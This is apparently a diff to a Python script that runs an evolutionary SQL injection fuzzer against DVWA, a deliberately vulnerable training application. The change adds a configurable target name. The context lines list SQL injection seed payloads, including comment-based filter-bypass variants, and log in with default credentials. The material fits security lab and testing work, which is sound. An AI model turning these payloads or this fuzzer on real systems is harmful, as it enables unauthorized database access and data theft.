@@ -23,12 +23,16 @@ def run_prometheus():
     
     target_user = os.getenv("TARGET_USER", "admin")
     target_pass = os.getenv("TARGET_PASS", "password")
+    target_name = os.getenv("TARGET_NAME", "default")
     
     # Force medium security as requested by user workflow
     target_security = "medium" 
     
     pop_size = int(os.getenv("POPULATION_SIZE", "12"))
     max_gens = int(os.getenv("MAX_GENERATIONS", "30"))
+    
+    # Phase 0: Ensure Target Profile
+    exp_manager.save_target_profile(client.base_url, target_name=target_name)
 
     # المرحلة 1 و 2: تسجيل الدخول وضبط الحماية
     if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
@@ -40,10 +44,7 @@ def run_prometheus():
     db_type = "MySQL"
     disable_quotes = True 
     
-    print(f"[*] Targeting SQL Injection with Direct POST Mode (Security: {target_security})", flush=True)
-    
-    # Targets Persistence
-    exp_manager.save_target_profile(client.base_url, db_type=db_type)
+    print(f"[*] Targeting Target '{target_name}' @ {client.base_url}", flush=True)
     
     # Load payloads from database API
     print("[*] Loading base payloads from Database...", flush=True)
@@ -63,7 +64,7 @@ def run_prometheus():
           "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
           "1/*!50000UNION*//*!50000SELECT*/1,2"
         ]
-
+    
     # Add quote-based seeds if level is low
     if target_security == "low":
         base_payloads.extend([
@@ -83,7 +84,8 @@ def run_prometheus():
         population_size=pop_size, 
         context=inj_type, 
         disable_strings=disable_quotes,
-        baseline=baseline_response
+        baseline=baseline_response,
+        target_name=target_name
     )
     
     start_gen = island.current_gen
